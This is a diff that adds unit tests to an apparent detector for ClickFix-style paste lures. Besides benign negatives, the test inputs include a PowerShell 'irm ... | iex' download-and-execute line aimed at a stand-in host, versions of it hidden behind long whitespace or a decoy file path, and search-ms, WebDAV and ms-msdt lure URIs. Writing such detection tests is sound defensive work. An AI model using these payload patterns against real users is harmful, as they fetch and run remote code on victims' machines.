@@ -49,6 +49,25 @@ describe("ClickFix command detector", () => {
     expect(clickFixTier("ubuntu-24.04.iso")).toBeNull();
   });
 
+  it("flags a search URI, a WebDAV path, and an Explorer address-bar payload", () => {
+    expect(clickFixTier("search-ms:query=invoice&crumb=location:\\\\files.example@SSL\\DavWWWRoot\\share&displayname=Downloads")).toBe("strong");
+    expect(clickFixTier("search:query=invoice&crumb=location:\\\\files.example@80\\share")).toBe("strong");
+    expect(clickFixTier("ms-search:query=invoice&crumb=location:\\\\files.example\\share")).toBe("strong");
+    expect(clickFixTier("ms-msdt:id PCWDiagnostic")).toBe("strong");
+    expect(clickFixTier("ms-settings:windowsdefender")).toBe("strong");
+    expect(clickFixTier("\\\\files.example@SSL\\DavWWWRoot\\invoice")).toBe("strong");
+    expect(clickFixTier("\\\\files.example@80\\share\\invoice")).toBe("strong");
+    expect(clickFixTier("\\\\files.example@443\\share\\invoice")).toBe("strong");
+    expect(clickFixTier(`C:\\Users\\Public\\Documents\\invoice.pdf${" ".repeat(40)}powershell -c "irm http://evil.test/a|iex"`)).toBe("strong");
+    expect(clickFixTier('C:\\Users\\Public\\Documents\\invoice.pdf # powershell -c "irm http://evil.test/a|iex"')).toBe("strong");
+    expect(clickFixTier(`${"powershell -c \"irm http://evil.test/a|iex\""}${" ".repeat(40)}C:\\Users\\Public\\Documents\\invoice.pdf`)).toBe("strong");
+    expect(clickFixTier("\\\\fileserver\\share\\readme.txt")).toBeNull();
+    expect(clickFixTier("C:\\Users\\Public\\Documents\\invoice.pdf")).toBeNull();
+    expect(clickFixTier("C:\\Users\\Public\\Documents\\invoice.pdf powershell Get-Process")).toBeNull();
+    expect(clickFixTier("search: see the manual")).toBeNull();
+    expect(clickFixTier("Open Settings from the Start menu")).toBeNull();
+  });
+
   it("does not treat install docs as a paste lure", () => {
     const docs = [
       "Install Homebrew. Open Terminal and run /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
